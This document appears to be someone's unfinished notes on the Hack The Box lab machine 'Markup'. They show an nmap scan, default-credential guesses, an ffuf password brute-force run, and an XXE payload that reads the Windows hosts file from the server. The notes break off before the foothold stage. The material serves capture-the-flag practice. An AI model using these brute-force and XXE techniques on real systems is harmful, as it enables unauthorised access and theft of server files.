-----

## Initial Information-

### IPs


Date Started:2023-04-13

----
## Initial Recon

- Did the intial scan, found that appache and ssh are running on the machine 
```shell

nmap -sV -sC  -p- markup.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 06:04 EDT
Nmap scan report for markup.htb (10.129.194.28)
Host is up (0.018s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9fa0f78cc6e2a4bd718768823e5db79f (RSA)
|   256 907d96a96e9e4d4094e7bb55ebb30b97 (ECDSA)
|_  256 f910eb76d46d4f3e17f393d60b8c4b81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping

```


- After enumerating multipe base passwords, managed to login with admin:password
```text
admin:admin 
administrator:administrator 
admin:administrator 
admin:password 
administrator:password
```
- Decided to brute force the password by using fuzz, by feeding the http request in as the payload captured through burpsuite
```shell
POST / HTTP/1.1
Host: markup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://markup.htb
Connection: close
Referer: http://markup.htb/
Cookie: PHPSESSID=719r0nkm1fj1batrgi1jpe02fe
Upgrade-Insecure-Requests: 1

username=admin&password=FUZZ

```


```shell
ffuf -c -request new.req -request-proto http -w ../../SecLists/Passwords/probable-v2-top1575.txt -fr "Wrong Credentials"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://markup.htb/
 :: Wordlist         : FUZZ: ../../SecLists/Passwords/probable-v2-top1575.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: http://markup.htb
 :: Header           : Referer: http://markup.htb/
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Host: markup.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Connection: close
 :: Header           : Cookie: PHPSESSID=719r0nkm1fj1batrgi1jpe02fe
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Regexp: Wrong Credentials
________________________________________________

password                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
Password                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 46ms]
:: Progress: [1575/1575] :: Job [1/1] :: 576 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
                                                                                                      
```

- Landed on the home page
![[Pasted image 20230413113407.png]]

```shell

POST /process.php HTTP/1.1

Host: markup.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/xml

Content-Length: 193

Origin: http://markup.htb

Connection: close

Referer: http://markup.htb/services.php

Cookie: PHPSESSID=719r0nkm1fj1batrgi1jpe02fe



<?xml version = "1.0"?>

<!DOCTYPE foo [<!ENTITY exploit SYSTEM "C:/windows/system32/drivers/etc/hosts"> ]>

<order><quantity>1</quantity><item>&exploit;</item><address>sdfsdf</address></order>
```

```shell

HTTP/1.1 200 OK

Date: Thu, 13 Apr 2023 12:35:58 GMT

Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28

X-Powered-By: PHP/7.2.28

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Content-Length: 837

Connection: close

Content-Type: text/html; charset=UTF-8



Your order for # Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
 has been processed
```

- Found a list of files for windows to see what can be exfiltrated, did this by passing the request into intruder, clearing the placeholders and 
----
## Foothold

---
## Tags

#Web 
#Injection
#Apache
#SSH
#PHP
#Reconnaissance
#ScheduledJobAbuse
#WeakCredentials
#ArbitraryFileUpload
#XXEInjection

Weak Permissions
----
## Resources